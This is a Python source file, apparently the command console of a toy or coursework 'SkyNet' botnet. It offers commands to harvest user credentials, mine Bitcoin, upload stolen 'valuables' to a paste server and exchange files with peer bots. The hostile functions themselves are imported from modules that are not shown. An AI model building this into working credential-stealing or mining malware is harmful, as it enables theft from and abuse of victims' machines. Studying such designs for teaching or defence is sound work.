import sys, socket, select, time
import threading
import colorama
from colorama import Fore, Style, init

from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables

init(convert=True)

def startup(): #Just a show of the system commands in an animated manner
    print()
    print(Fore.MAGENTA +"[+] Welcome to SkyNet" + Style.RESET_ALL)
    time.sleep(1)
    print(Fore.MAGENTA +"[+] Loading OS\n" + Style.RESET_ALL)
    time.sleep(1)
    print(Fore.GREEN +"+----------------------------------------+")
    time.sleep(0.5)
    print("|            SkyNet Commands             |")
    time.sleep(0.5)
    print("|                                        |")
    time.sleep(0.5)
    print("| p2p echo - Peer to Peer Echo           |")
    time.sleep(0.5)
    print("| p2p upload - Peer to Peer File Upload  |")
    time.sleep(0.5)
    print("| upload - Upload File to Server         |")
    time.sleep(0.5)
    print("| download - Download File from Server   |")
    time.sleep(0.5)
    print("| mine - Mine for Bitcoins               |")
    time.sleep(0.5)
    print("| harvest - Harvest User Credentials     |")
    time.sleep(0.5)
    print("| list - Show List of Files              |")
    time.sleep(0.5)
    print("| exit, quit - Exit Network              |")
    time.sleep(0.5)
    print("+----------------------------------------+\n" + Style.RESET_ALL)
    time.sleep(1)

def p2p_echo(): #find other bots listening on the network
    try:
        sconn = find_bot()
        sconn.send(bytes("ECHO", "utf-8"))
        while True:
            msg = input("[+] Message> ")
            byte_msg = bytes(msg, "utf-8")
            sconn.send(byte_msg)
            echo = sconn.recv()
            assert(echo == byte_msg)
            if msg.lower() == "exit" or msg.lower() == "quit":
                sconn.close()
                break
    except socket.error:
        print(Fore.CYAN +"[-] Connection closed unexpectedly\n" + Style.RESET_ALL)

def p2p_upload(fn): #upload files
    if fn not in filestore: # For only signed files
        print(Fore.RED +"[-] File does not exist\n" + Style.RESET_ALL)
        return
    sconn = find_bot()
    sconn.send(bytes("FILE", "utf-8"))
    p2p_upload_file(sconn, fn)


if __name__ == "__main__":
    startup()
    thr = threading.Thread(target=bot_server) #We have to set up a thread for multiple bots to be able to connect
    thr.setDaemon(True)
    thr.start()
    time.sleep(0.5)
    while True:
        raw_cmd = input("[+] Enter command: ") #enter your desired command and watch the 'awesome' outcome in colors. Thanks to the colorama library
        cmd = raw_cmd.split()
        if not cmd:
            print(Fore.CYAN +"[-] Command Needed\n"+ Style.RESET_ALL)
            continue
        if len(cmd)>1:
            if cmd[0].lower() == "p2p" and cmd[1].lower() == "echo":
                print (Fore.GREEN +"[+] "+ "P2P Echo Engine Starting\n" + Style.RESET_ALL)
                p2p_echo()
            elif cmd[0].lower() == "p2p" and cmd[1].lower() == "upload":
                while True:
                    fn = input('[+] Enter Filename: ')
                    if not fn:
                        print(Fore.CYAN +"[-] File Needed\n"+ Style.RESET_ALL)
                    else:
                        break
                print (Fore.GREEN +"[+] "+ "P2P Upload Starting"+ Style.RESET_ALL)
                p2p_upload(fn)
            else:
                print(Fore.RED +"[-] Invalid Command\n" + Style.RESET_ALL)
        elif cmd[0].lower() == "download" and len(cmd) == 1:
            while True:
                fn = input('[+] Enter Filename: ')
                if not fn:
                    print(Fore.CYAN +"[-] File Needed\n"+ Style.RESET_ALL)
                else:
                    break
            print (Fore.GREEN +"[+] File Download Starting" + Style.RESET_ALL)
            download_from_pastebot(fn)
        elif cmd[0].lower() == "upload" and len(cmd) == 1:
            while True:
                fn = input('[+] Enter Filename: ')
                if not fn:
                    print(Fore.CYAN +"[-] File Needed\n"+ Style.RESET_ALL)
                else:
                    break
            print (Fore.GREEN +"[+] "+ "File Upload Starting" + Style.RESET_ALL)
            upload_valuables_to_pastebot(fn)
        elif cmd[0].lower() == "mine" and len(cmd) == 1:
            print (Fore.GREEN +"[+] "+ "Bitcoin Mining Starting" + Style.RESET_ALL)
            bit_addr = bitcoin_mine()
            save_valuable("Bitcoin: %s" % bit_addr)
            print(Fore.GREEN +"[+] Mined and found Bitcoin address: " + str(bit_addr) +"\n" + Style.RESET_ALL)
        elif cmd[0].lower() == "harvest" and len(cmd) == 1:
            print (Fore.GREEN +"[+] "+ "Harvesting User Credentials Started" + Style.RESET_ALL)
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print(Fore.GREEN + "[+] Found credentials %s" % (userpass,) + "\n" + Style.RESET_ALL)
        elif cmd[0].lower() == "list" and len(cmd) == 1:
            print (Fore.GREEN +"[+] "+ "List of Files" + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Files stored by this bot: %s" % ", ".join(filestore.keys()) + Style.RESET_ALL)
            print(Fore.GREEN + "[+] Valuables stored by this bot: " + str(valuables) + "\n"+ Style.RESET_ALL)
        elif cmd[0].lower() == "quit" or cmd[0].lower() == "exit":
            print (Fore.CYAN +"[+] "+ "Exiting Network\n" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED +"[-] Invalid Command\n" + Style.RESET_ALL)
